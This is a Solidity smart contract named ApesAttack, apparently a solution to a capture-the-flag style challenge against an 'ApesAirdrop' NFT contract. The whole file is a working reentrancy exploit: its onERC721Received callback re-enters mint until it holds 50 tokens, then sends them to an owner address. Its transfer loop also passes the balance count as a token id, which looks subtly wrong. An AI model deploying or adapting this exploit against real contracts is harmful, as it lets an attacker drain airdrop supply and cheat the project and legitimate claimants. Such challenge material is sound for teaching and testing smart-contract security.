// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {ApesAirdrop} from "./ApesAirdrop.sol";

contract ApesAttack is ERC721, IERC721Receiver {
    ApesAirdrop public apes;
    address public owner;
    uint256 count = 1;

    constructor(address _apes, address _owner) ERC721("Crazy Apes", "APE") {
        apes = ApesAirdrop(_apes);
        owner = _owner;
    }

    function attack() public {
        apes.mint();
    }

    function getApesCountForContract() public view returns (uint256) {
        return apes.balanceOf(address(this));
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4)
    {
        if (getApesCountForContract() <= 49) {
            apes.mint();
        } else {
            while (getApesCountForContract() > 0) {
                apes.safeTransferFrom(address(this), owner, getApesCountForContract());
            }
        }

        //apes.mint();
        return this.onERC721Received.selector;
    }
}
